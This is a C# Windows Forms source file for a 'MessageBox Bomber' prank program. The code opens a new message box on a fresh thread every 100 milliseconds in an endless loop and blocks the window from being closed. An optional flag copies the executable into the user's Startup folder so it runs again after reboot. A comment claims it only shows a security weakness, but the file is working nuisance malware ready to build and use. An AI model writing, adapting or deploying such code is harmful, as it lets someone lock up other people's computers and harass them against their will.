using System;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Management;
using System.Threading;

namespace MessageBox_Bomber_by_WitBlack
{
    public partial class frm_main : Form
    {
        public frm_main()
        {
            InitializeComponent();
        }

        public void Message()
        {
            MessageBox.Show(Description, Title);
        }

        // configs
        bool Copy_to_startup = false;
        public string Title = "this is simple title",Description = "this is simple description.";
        string Name_In_startup = "MessageBomber.exe";
        int Sleep_time = 100; // by mili second


        /*
         * POLICY:
         * 
         * Please do not use the abuse program. It's just for showing security weak.
         * Consequences of abuse is on the user. ***
         * 
         */


        private void frm_main_Load(object sender, EventArgs e)
        {
            if (Copy_to_startup)
            {
                try
                {
                    File.Copy(Process.GetCurrentProcess().MainModule.FileName,"C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + Name_In_startup);
                }
                catch
                {}
            }
            while (true)
            {
                Thread t = new Thread(new ThreadStart(Message));
                t.Start();
                Thread.Sleep(Sleep_time);
            }
        }

        private void frm_main_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
    }
}
